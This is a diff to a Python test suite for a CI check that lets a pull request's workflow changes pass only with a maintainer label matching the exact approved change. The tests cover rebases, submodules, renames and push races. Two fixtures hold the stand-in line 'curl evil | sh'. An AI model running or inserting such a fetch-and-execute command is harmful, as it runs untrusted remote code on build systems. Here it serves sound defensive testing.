@@ -30,6 +30,8 @@ WORKFLOW = HERE.parent / ".github" / "workflows" / "pin-only.yml"
 REPO = "lemonfiber/core"
 OLD, NEW, OFF = "a" * 40, "b" * 40, "c" * 40
 BASE, HEAD, MERGE_BASE = "1" * 40, "2" * 40, "3" * 40
+#: A head the branch had when the label was added, and the merge base that head was on.
+EARLIER, EARLIER_BASE = "4" * 40, "5" * 40
 
 CALLER = """name: ci
 on: [pull_request]
@@ -54,9 +56,14 @@ class Forge:
     """The REST API for one pull request: git's trees at the merge base and the
     head, and spec's history as the compare API reports it."""
 
-    def __init__(self, files: dict[str, tuple[str | None, str | None]], history=None, modes=None):
-        # path under .github -> (text at the merge base, text at the head); None where absent
+    def __init__(self, files: dict[str, tuple[str | None, ...]], history=None, modes=None):
+        # path under .github -> (text at the merge base, text at the head, and at any commit
+        # `states` adds); None where absent
         self.files = files
+        # Each commit whose tree the forge holds, as its place in those tuples, and the
+        # merge base the compare API names for each head.
+        self.states = {MERGE_BASE: 0, HEAD: 1}
+        self.bases = {HEAD: MERGE_BASE}
         self.modes = modes or {}
         # (base, head) -> status; NEW is ahead of OLD and on main, OFF is not on main
         self.history = history or {(OLD, NEW): "ahead", (NEW, "main"): "identical",
@@ -79,7 +86,7 @@ class Forge:
     def tree(self, at: int) -> list[dict]:
         entries = []
         for path, texts in self.files.items():
-            text = texts[at]
+            text = texts[at] if at < len(texts) else None
             if text is None:
                 continue
             self.blobs[blob(text)] = text
@@ -107,14 +114,20 @@ class Forge:
             branch = path.removeprefix(runs).split("&", 1)[0]
             wanted = [r for r in self.runs if urllib.parse.quote(self.branch, safe="") == branch]
             return {"workflow_runs": paged(sorted(wanted, key=lambda r: r["created_at"], reverse=True), path)}
-        if path == f"repos/{REPO}/compare/{BASE}...{HEAD}":
-            return {"merge_base_commit": {"sha": MERGE_BASE}}
-        for at, commit in ((0, MERGE_BASE), (1, HEAD)):
+        if path.startswith(f"repos/{REPO}/compare/{BASE}..."):
+            head = path.rsplit("...", 1)[1]
+            if head not in self.bases:
+                raise subprocess.CalledProcessError(1, ["gh", "api", path], stderr="gh: Not Found (HTTP 404)")
+            return {"merge_base_commit": {"sha": self.bases[head]}}
+        for commit, at in self.states.items():
             if path == f"repos/{REPO}/git/trees/{commit}":
                 return {"tree": [{"path": "src", "type": "tree", "mode": "040000", "sha": "f" * 40},
-                                 {"path": ".github", "type": "tree", "mode": "040000", "sha": f"{at}" * 40}],
+                                 {"path": ".github", "type": "tree", "mode": "040000", "sha": f"e{at}" * 20}],
                         "truncated": f"root{at}" in self.truncated}
-            if path == f"repos/{REPO}/git/trees/{str(at) * 40}?recursive=1":
+            if path == f"repos/{REPO}/git/trees/{commit}?recursive=1":
+                whole = [*self.tree(at), {"path": "src", "type": "tree", "mode": "040000", "sha": "f" * 40}]
+                return {"tree": whole, "truncated": f"whole{at}" in self.truncated}
+            if path == f"repos/{REPO}/git/trees/{f'e{at}' * 20}?recursive=1":
                 inside = [dict(e, path=e["path"].removeprefix(".github/")) for e in self.tree(at)
                           if e["path"].startswith(".github/")]
                 inside.append({"path": "workflows", "type": "tree", "mode": "040000", "sha": "e" * 40})
@@ -281,7 +294,7 @@ class Refuses(unittest.TestCase):
 
 
 class Approved(unittest.TestCase):
-    """A change to the checks passes with `workflows-approved` added after the last push, and only then."""
+    """A change to the checks passes with `workflows-approved` added for the change its head makes, and only then."""
 
     def changed(self) -> Forge:
         forge = Forge({CI: (caller(), caller() + "  extra:\n    runs-on: x\n")})
@@ -292,7 +305,7 @@ class Approved(unittest.TestCase):
         code, said = run(forge)
         self.assertEqual(code, 1, said)
         self.assertIn(f"::error::{CI} changes more than spec's pins", said)
-        self.assertIn(f"A maintainer approves it by adding `{pin_only.APPROVED}` after its last push", said)
+        self.assertIn(f"A maintainer approves it by adding `{pin_only.APPROVED}` for the change it makes", said)
         for word in words:
             self.assertIn(word, said)
 
@@ -308,11 +321,198 @@ class Approved(unittest.TestCase):
         self.assertEqual(code, 0, said)
         self.assertIn(f"::notice::{CI} changes more than spec's pins, and a maintainer approved it", said)
 
-    def test_a_push_after_the_label_fails(self):
+    def test_a_push_after_the_label_to_a_head_the_forge_cannot_return_fails(self):
+        forge = self.changed()
+        forge.runs.append(ran(3, head=OLD))
+        forge.labels = [pin_only.APPROVED]
+        forge.timeline = [labeled(3)]
+        self.refused(forge, f"{OLD[:8]}, its head when `{pin_only.APPROVED}` was added at {at(3)}, cannot be read")
+
+    def earlier(self, base: str, then: str) -> Forge:
+        """The pull request labelled at minute 3 on EARLIER, whose merge base held `base` and which made `then`."""
+        forge = Forge({CI: (caller(), caller() + "  extra:\n    runs-on: x\n", base, then)})
+        forge.states.update({EARLIER_BASE: 2, EARLIER: 3})
+        forge.bases[EARLIER] = EARLIER_BASE
+        forge.runs = [ran(1, head=EARLIER), ran(3, head=EARLIER), ran(5)]
+        forge.labels = [pin_only.APPROVED]
+        forge.timeline = [labeled(3)]
+        return forge
+
+    def test_a_push_that_changes_the_change_after_the_label_fails(self):
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: y\n")
+        self.refused(forge, f"what {HEAD[:8]} changes is not what {EARLIER[:8]} changed when "
+                            f"`{pin_only.APPROVED}` was added at {at(3)}")
+
+    def test_a_rebase_that_keeps_the_change_keeps_the_approval(self):
+        # The same objects changed, on a merge base whose other files are newer.
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.files[".github/workflows/other.yml"] = ("newer", "newer", "older", "older")
+        code, said = run(forge)
+        self.assertEqual(code, 0, said)
+        self.assertIn(f"::notice::{CI} changes more than spec's pins, and a maintainer approved it", said)
+
+    def test_a_rebase_onto_a_main_that_changed_the_same_file_needs_the_label_again(self):
+        # Compared by objects, never by a diff of text: the file the pull request
+        # changes moved on `main`, so the change is read afresh by a maintainer.
+        older = caller().replace("name: ci", "name: ci\nrun-name: older")
+        forge = self.earlier(older, older + "  extra:\n    runs-on: x\n")
+        self.refused(forge, "is not what")
+
+    def test_the_same_lines_somewhere_else_are_not_the_change_approved(self):
+        moved = caller().replace("jobs:\n", "jobs:\n  extra:\n    runs-on: x\n")
+        forge = self.earlier(caller(), moved)
+        self.refused(forge, "is not what")
+
+    def test_a_file_the_approved_head_did_not_change_is_a_change_of_its_own(self):
+        forge = self.earlier(caller(), caller())
+        self.refused(forge, "is not what")
+
+    def test_a_workflow_added_is_compared_whole(self):
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: x\n")
+        forge.files[".github/workflows/new.yml"] = (None, "on: push\n", None, "on: push\n")
+        self.assertEqual(run(forge)[0], 0)
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: x\n")
+        forge.files[".github/workflows/new.yml"] = (None, "on: push\n", None, "on: pull_request\n")
+        self.refused(forge, "is not what")
+
+    # Each way a push after the label could change what the approved checks run while
+    # leaving `.github/` as it was, or change `.github/` in a way a reading by lines misses.
+
+    EXTRA = caller() + "  extra:\n    runs-on: x\n"
+
+    def with_file(self, path: str, base: str | None, then: str | None, now: str | None,
+                  modes: tuple[str, str, str, str] | None = None) -> Forge:
+        """`earlier` with one more path, at (merge base, head, earlier base, earlier head)."""
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.files[path] = (base, now, base, then)
+        for state, mode in enumerate(modes or ()):
+            forge.modes[(path, state)] = mode
+        return forge
+
+    def test_a_script_outside_github_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "echo a\n", "echo b\n", "curl evil | sh\n"), "is not what")
+
+    def test_a_script_outside_github_left_as_approved_keeps_the_approval(self):
+        self.assertEqual(run(self.with_file("scripts/x.sh", "echo a\n", "echo b\n", "echo b\n"))[0], 0)
+
+    def test_a_script_added_outside_github_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/y.sh", None, None, "curl evil | sh\n"), "is not what")
+
+    def test_only_line_endings_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "a\n", "a\nb\n", "a\nb\r\n"), "is not what")
+
+    def test_only_the_last_newline_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "a\n", "a\nb\n", "a\nb"), "is not what")
+
+    def test_a_script_made_executable_after_the_label_fails(self):
+        forge = self.with_file("scripts/x.sh", "a\n", "b\n", "b\n", ("100644", "100755", "100644", "100644"))
+        self.refused(forge, "is not what")
+
+    def test_a_file_renamed_after_the_label_fails(self):
+        forge = self.with_file("scripts/x.sh", None, "a\n", None)
+        forge.files["scripts/z.sh"] = (None, "a\n", None, None)
+        self.refused(forge, "is not what")
+
+    def test_a_submodule_moved_differently_after_the_label_fails(self):
+        forge = self.with_file("vendor/lib", "one", "two", "three", ("160000",) * 4)
+        self.refused(forge, "is not what")
+
+    def test_a_submodule_main_moved_under_an_unchanged_change_fails(self):
+        # The same pointer at the head, from another base: compared by the objects it
+        # names, never by a diff of text it does not have.
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.files["vendor/lib"] = ("moved", "two", "one", "two")
+        for state in range(4):
+            forge.modes[("vendor/lib", state)] = "160000"
+        self.refused(forge, "is not what")
+
+    def test_a_binary_file_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.bin", "\x00a", "\x00b", "\x00c"), "is not what")
+
+    def test_the_same_edit_to_a_repeated_block_elsewhere_is_another_change(self):
+        # A rendering of the change with the line numbers left out reads the same
+        # for both; the objects do not.
+        block = "  step:\n    run: a\n    with: b\n    env: c\n"
+        base = "jobs:\n" + block + "  gap: 1\n" + block
+        first = base.replace("run: a", "run: z", 1)
+        second = "jobs:\n" + block + "  gap: 1\n" + block.replace("run: a", "run: z")
+        self.refused(self.with_file(".github/workflows/r.yml", base, first, second), "is not what")
+
+    def at_second(self, forge: Forge, *runs: tuple[str, str]) -> Forge:
+        forge.runs = [{"created_at": stamp, "head_sha": head, "head_repository": {"full_name": FORK}}
+                      for stamp, head in runs]
+        return forge
+
+    def test_a_head_pushed_moments_before_the_label_is_not_approved(self):
+        forge = self.at_second(self.earlier(caller(), self.EXTRA),
+                               (at(1), OLD), ("2026-10-09T21:02:30Z", EARLIER), (at(3), EARLIER), (at(5), HEAD))
+        self.refused(forge, f"its head became {EARLIER[:8]} at 2026-10-09T21:02:30Z, less than "
+                            f"{pin_only.QUIET} seconds before")
+
+    def test_a_head_held_a_minute_before_the_label_is_approved(self):
+        forge = self.at_second(self.earlier(caller(), self.EXTRA),
+                               (at(1), OLD), (at(2), EARLIER), (at(3), EARLIER), (at(5), HEAD))
+        code, said = run(forge)
+        self.assertEqual(code, 0, said)
+        self.assertIn(f"`{pin_only.APPROVED}` was added at {at(3)} on {EARLIER}, which held the branch from {at(2)}",
+                      said)
+
+    def test_the_run_the_label_started_for_another_head_is_a_race(self):
+        forge = self.at_second(self.earlier(caller(), self.EXTRA), (at(1), EARLIER), (at(3), HEAD), (at(5), HEAD))
+        forge.timeline = [{"event": "labeled", "created_at": "2026-10-09T21:02:59Z",
+                           "label": {"name": pin_only.APPROVED}, "actor": {"login": MAINTAINER}}]
+        self.refused(forge, f"is for {HEAD[:8]}, not {EARLIER[:8]}, so a push landed as it was added")
+
+    def test_no_run_started_by_the_label_is_unconfirmed(self):
+        forge = self.at_second(self.earlier(caller(), self.EXTRA), (at(1), EARLIER))
+        self.refused(forge, "no run of this check started when")
+
+    def test_runs_of_the_base_repository_on_a_branch_of_the_same_name_are_not_the_fork_s(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.runs += [{"created_at": at(2), "head_sha": OFF, "head_repository": {"full_name": REPO}},
+                       {"created_at": at(3), "head_sha": OFF, "head_repository": {"full_name": REPO}}]
+        self.assertEqual(run(forge)[0], 0)
+
+    def test_a_base_changed_after_the_label_fails(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.timeline.append({"event": "base_ref_changed", "created_at": at(4)})
+        self.refused(forge, f"its base was changed at {at(4)}, after `{pin_only.APPROVED}` was added at {at(3)}")
+
+    def test_a_base_changed_before_the_label_is_the_base_approved(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.timeline.insert(0, {"event": "base_ref_changed", "created_at": at(2)})
+        self.assertEqual(run(forge)[0], 0)
+
+    def test_a_tree_the_forge_answers_in_part_approves_nothing(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.truncated.add("whole3")
+        code, said = run(forge)
+        self.assertEqual(code, 2, said)
+        self.assertIn("came back truncated", said)
+
+    def test_what_the_pull_request_says_approves_nothing(self):
+        # Nothing the author writes is read as the approval: not the body, not a
+        # comment, not a file. The approved change is read from the forge each time.
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: y\n")
+        forge.files[".github/approved.txt"] = (None, "approved: " + EARLIER, None, None)
+        self.refused(forge, "is not what")
+        self.assertFalse([a for a in forge.asked if "/comments" in a[0] or "/contents/" in a[0]])
+
+    def test_runs_at_the_same_moment_on_two_heads_name_no_approved_head(self):
         forge = self.changed()
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(3)]
-        self.refused(forge, f"its head was {OLD[:8]} at {at(1)}", f"was added at {at(3)}")
+        forge.runs = [ran(1, head=OLD), ran(1), ran(5)]
+        self.refused(forge, f"the runs at {at(1)} name", "which head")
+
+    def test_a_link_or_a_submodule_is_compared_by_what_it_names(self):
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: x\n")
+        forge.files[".github/actions/x"] = ("one", "two", "one", "two")
+        for state in range(4):
+            forge.modes[(".github/actions/x", state)] = "160000"
+        code, said = run(forge)
+        self.assertEqual(code, 0, said)
+        self.assertFalse([a for a in forge.asked if a[0].endswith(f"/git/blobs/{blob('two')}")])
 
     def test_the_label_added_by_one_who_does_not_maintain_the_repository_fails(self):
         for who in ("triager", "writer", "someone", "dependabot[bot]"):
@@ -325,6 +525,7 @@ class Approved(unittest.TestCase):
 
     def test_the_label_added_by_one_who_holds_maintain_passes(self):
         forge = self.changed()
+        forge.runs.append(ran(8))
         forge.roles["keeper"] = "maintain"
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(8, by="keeper")]
@@ -350,15 +551,17 @@ class Approved(unittest.TestCase):
 
     def test_the_label_added_again_after_a_push_passes(self):
         forge = self.changed()
+        forge.runs.append(ran(7))
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(3), labeled(4, event="unlabeled"), labeled(7)]
         self.assertEqual(run(forge)[0], 0)
 
-    def test_a_force_push_after_the_label_fails(self):
+    def test_a_force_push_after_the_label_that_keeps_the_change_keeps_the_approval(self):
         forge = self.changed()
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(8), {"event": "head_ref_force_pushed", "created_at": at(9)}]
-        self.refused(forge, f"its branch was force-pushed at {at(9)}")
+        forge.runs.append(ran(9))
+        self.assertEqual(run(forge)[0], 0)
 
     def test_a_label_no_event_records_fails(self):
         forge = self.changed()
@@ -374,6 +577,7 @@ class Approved(unittest.TestCase):
 
     def test_a_run_from_a_branch_of_the_same_name_elsewhere_is_not_this_pull_request_s(self):
         forge = self.changed()
+        forge.runs.append(ran(8))
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(8)]
         forge.runs.append(ran(9, head=OFF, source=ELSEWHERE))
@@ -390,6 +594,7 @@ class Approved(unittest.TestCase):
 
     def test_a_branch_name_is_one_query_value(self):
         forge = self.changed()
+        forge.runs.append(ran(8))
         forge.branch = "a&event=push#x"
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(8)]
@@ -398,6 +603,7 @@ class Approved(unittest.TestCase):
 
     def test_a_list_read_a_page_at_a_time(self):
         forge = self.changed()
+        forge.runs.append(ran(8))
         forge.labels = [pin_only.APPROVED]
         forge.timeline = [labeled(2, "ci")] * pin_only.PER_PAGE + [labeled(8)]
         self.assertEqual(run(forge)[0], 0)
@@ -657,6 +863,19 @@ class CannotRead(unittest.TestCase):
         self.assertIn("could not be read", said)
         self.assertIn("HTTP 404", said)
 
+    def test_a_workflow_file_that_is_not_text_is_a_failure_not_a_pass(self):
+        forge = Forge({CI: (caller(), caller() + "x")})
+        real = forge.__call__
+
+        def binary(args, raw):
+            if raw:
+                raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")
+            return real(args, raw)
+
+        code, said = run(binary)
+        self.assertEqual(code, 2, said)
+        self.assertIn("could not be read", said)
+
     def test_an_answer_of_another_shape(self):
         code, said = run(lambda args, raw: {})
         self.assertEqual(code, 2, said)
@@ -711,20 +930,29 @@ class TheWorkflow(unittest.TestCase):
         self.assertIn('--workflow "$CALLING"', last["run"])
         self.assertEqual(last["env"]["CALLING"], "${{ github.workflow_ref }}")
 
-    def test_the_caller_it_documents_runs_on_every_new_head_and_cancels_per_pull_request(self):
+    def test_the_caller_it_documents_runs_on_every_new_head_and_cancels_only_on_a_push(self):
         # GitHub attaches a pull_request_target run's checks to the pull request's head
         # commit (on website-lemonfiber.app#133, run 37852167512's check suite named head
         # 14c2666e, the pull request's head, while main was 577a86dd), and protection asks
         # for the check on the commit it would merge. So each new head needs its own run.
         documented = "\n".join(line[4:] for line in WORKFLOW.read_text(encoding="utf-8").splitlines()
                                if line.startswith("#   "))
-        caller_text = documented[documented.index("on:"):documented.index("jobs:")]
-        shown = yaml.safe_load(caller_text)
+        shown = yaml.safe_load(documented[documented.index("on:"):])
         self.assertEqual(set(shown[True]["pull_request_target"]["types"]),
                          {"opened", "synchronize", "reopened", "labeled", "unlabeled"})
         import check_superseded_runs
-        self.assertEqual(shown["concurrency"]["group"], check_superseded_runs.TARGET_GROUP)
-        self.assertIs(shown["concurrency"]["cancel-in-progress"], True)
+        self.assertEqual(shown["concurrency"]["group"], check_superseded_runs.LABELLED_GROUP)
+        self.assertEqual(shown["concurrency"]["cancel-in-progress"], check_superseded_runs.PUSH_CANCELS)
+        self.assertEqual(shown["jobs"]["pin-only"]["if"], f"${{{{ !({check_superseded_runs.OTHER_LABEL}) }}}}")
+
+    def test_spec_calls_it_the_way_it_documents(self):
+        documented = "\n".join(line[4:] for line in WORKFLOW.read_text(encoding="utf-8").splitlines()
+                               if line.startswith("#   "))
+        shown = yaml.safe_load(documented[documented.index("on:"):])
+        own = yaml.safe_load((WORKFLOW.parent / "pin-only-check.yml").read_text(encoding="utf-8"))
+        self.assertEqual(own[True], shown[True])
+        self.assertEqual(own["concurrency"], shown["concurrency"])
+        self.assertEqual(own["jobs"]["pin-only"]["if"], shown["jobs"]["pin-only"]["if"])
 
     def test_it_refuses_any_event_but_pull_request_target(self):
         script = self.steps[0]["run"]
